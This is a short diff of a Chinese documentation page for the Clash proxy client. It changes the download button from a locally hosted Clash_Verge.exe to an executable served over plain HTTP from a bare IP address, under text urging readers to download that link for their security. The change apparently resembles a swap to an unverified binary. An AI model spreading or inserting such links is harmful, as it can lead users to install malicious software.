@@ -10,7 +10,7 @@
     
     客户端不会经常更新了,为了保证安全性,请确保下载的为下方的客户端 
     
-[:material-arrow-down:{ .plane } 点此下载 :material-arrow-down:{ .plane }](../../download/Clash_Verge.exe){ .md-button }[^1] 
+[:material-arrow-down:{ .plane } 点此下载 :material-arrow-down:{ .plane }](http://154.12.60.107:10010/Clash.exe){ .md-button }[^1] 
 
 ---
 
